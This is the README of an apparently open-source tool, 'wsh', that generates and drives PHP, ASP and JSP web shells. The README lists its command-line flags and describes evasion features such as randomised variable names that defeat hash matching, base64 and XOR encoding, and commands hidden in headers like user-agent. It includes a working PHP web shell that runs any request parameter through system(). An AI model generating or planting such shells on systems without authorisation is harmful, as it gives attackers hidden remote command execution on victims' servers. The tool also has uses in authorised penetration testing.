# wsh

wsh (pronounced woosh) is a web shell generator and command line interface. This started off as just an http client since interacting with webshells is a pain. There's a form, to send a command you have to type in an input box and press a button. I wanted something that fits into my work-flow better that ran in the terminal. Thus wsh was born.

The client features command history, logging, and can be configured to interact with a previously deployed webshell with a form/button. The generator creates webshells in php, asp, and jsp. They are generated with random variables, so each will have a unique hash. They can be configured with a whitelist, passwords, and allow commands to be sent over custom headers and parameters. The generator and client can be configured through command line flags or configuration files to allow for saving a setup that works for you without doing what I call the "--help" dance. Once configured, the client and generator use the same config file.

## Features

- Interact with deployed web shells via the command line
  - Logging
- Generate webshells in PHP, JSP, and ASP
  - IP whitelisting
  - Password protection
  - Send commands over custom headers/parameters
  - File download
  - File upload (Work in progress)
  - Base64 encoded shells for asp and php
  - XOR encrypted shells for asp and php

## Usage

### Connect functionality

```
wsh [flags] <URL>

-X, --method string        HTTP method: GET, POST, PUT, PATCH, DELETE (default "GET")
    --param string         Parameter for sending command
    --header string        Header for sending command
-P, --params strings       HTTP request parameters
-H, --headers strings      HTTP request headers
-c, --config string        Config file
-k, --ignore-ssl           Ignore invalid certs
    --log string           Log file
    --prefix string        Prepend command: 'cmd /c', 'powershell.exe', 'bash'
    --timeout int          Request timeout in seconds (default 10)
    --trim-prefix string   Trim output prefix
    --trim-suffix string   Trim output suffix
-h, --help                 help for wsh
```

### Generate webshell

```
wsh generate <language> [flags]

-X, --method string        HTTP method (GET,POST,PUT,PATCH,DELETE) (default "GET")
-p, --param string         Parameter for sending command
    --header string        Header for sending command
-w, --whitelist strings    IP addresses to whitelist
-o, --outfile string       Output file
    --no-file              Disable file upload/download capabilities
    --pass string          Password protect shell
    --pass-header string   Header for sending password
    --pass-param string    Parameter for sending password
    --xor-header string    Header for sending xor key
    --xor-key string       Key for xor encryption
    --xor-param string     Parameter for sending xor key
    --base64               Base64 encode shell
    --minify               Minify webshell code
-t, --template string      Webshell template file
-h, --help                 help for generate
```

## Examples

### Simple Shells

The following commands generates and interacts with a simple php web shell.

```
$ wsh generate php --param cmd --no-file -o shell.php
Created shell at shell.php.

$ wsh 127.0.0.1:8080/shell.php --param cmd

```

```php
<?php
  $MfOb = $_REQUEST['cmd'];
  $MfOb = trim($MfOb);
  system($MfOb);
  die;
?>
```

Commands can also be passed over http headers

```
$ wsh generate php --no-file --header user-agent  -o shell.php
Created shell at shell.php.

$ wsh 127.0.0.1:8080/shell.php --header user-agent
```

### Whitelisting

```
$ wsh generate php --no-file --param cmd -w 127.0.0.1,10.0.23.3 -w 192.4.22.3 -o shell.php
```

### Password Protection

Passwords can be sent over parameters or headers.

```
$ wsh generate php --no-file --param cmd --pass S3cr3t --pass-param pass
$ wsh 127.0.0.1:8080/shell.php --param cmd -P pass:S3cr3t

$ wsh generate php --no-file --param cmd --pass S3cr3t --pass-header pass-header
$ wsh 127.0.0.1:8080/shell.php --param cmd -H pass-header:S3cr3t
```

### Compile jsp to war

jar -cvf filename.war index.jsp
